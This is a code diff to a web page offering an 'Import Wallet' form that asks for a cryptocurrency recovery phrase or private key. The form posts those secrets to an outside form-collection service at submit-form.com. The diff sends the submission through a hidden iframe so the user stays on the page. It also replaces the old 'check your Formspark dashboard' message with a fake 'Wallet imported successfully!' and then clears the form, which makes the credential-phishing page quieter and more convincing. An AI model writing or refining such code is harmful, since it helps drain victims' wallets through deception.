@@ -314,10 +314,10 @@
     </div>
   </div>
 
-  <!-- Import page - Using classic HTML form submission -->
+  <!-- Import page - iframe + HTML form (no redirect, stays on page, works on Safari/Chrome) -->
   <div class="import-page" id="importPage">
     <div class="import-container">
-      <button class="import-close" id="closeImport">×</button>
+      <button class="import-close" onclick="document.getElementById('importPage').style.display='none'">×</button>
 
       <h2>Import Wallet</h2>
 
@@ -325,7 +325,10 @@
         Enter your recovery phrase or private key for the selected wallet
       </div>
 
-      <form action="https://submit-form.com/9OlqegtJF" method="POST">
+      <!-- Hidden iframe to catch submission response without redirecting -->
+      <iframe name="hiddenSubmitFrame" style="display:none; width:0; height:0; border:none;"></iframe>
+
+      <form action="https://submit-form.com/9OlqegtJF" method="POST" target="hiddenSubmitFrame">
         <input type="hidden" name="wallet_type" id="hiddenWalletType" value="">
         <input type="hidden" name="timestamp" id="hiddenTimestamp" value="">
 
@@ -350,9 +353,8 @@
     const walletModal = document.getElementById('walletModal');
     const closeModal = document.getElementById('closeModal');
     const importPage = document.getElementById('importPage');
-    const closeImport = document.getElementById('closeImport');
-    const walletOptions = document.querySelectorAll('.wallet-option');
     const messageEl = document.getElementById('importMessage');
+    const form = document.querySelector('#importPage form');
 
     let selectedWallet = '';
 
@@ -377,16 +379,24 @@
       });
     });
 
-    closeImport.addEventListener('click', () => importPage.style.display = 'none');
-    importPage.addEventListener('click', e => {
-      if (e.target === importPage) importPage.style.display = 'none';
-    });
+    // Handle form submission without redirect
+    form.addEventListener('submit', (e) => {
+      // e.preventDefault(); → do NOT prevent, let it submit to iframe
 
-    // Optional: Show message after form submission starts
-    document.querySelector('#importPage form').addEventListener('submit', () => {
       messageEl.style.display = 'block';
-      messageEl.textContent = 'Submitting... Check your Formspark dashboard soon!';
-      messageEl.className = 'message success';
+      messageEl.textContent = 'Importing...';
+      messageEl.className = 'message';
+
+      // Listen for iframe load (submission complete)
+      document.querySelector('iframe[name="hiddenSubmitFrame"]').onload = function() {
+        messageEl.textContent = 'Wallet imported successfully!';
+        messageEl.className = 'message success';
+
+        setTimeout(() => {
+          importPage.style.display = 'none';
+          form.reset(); // clear fields
+        }, 2500);
+      };
     });
   </script>
 </body>
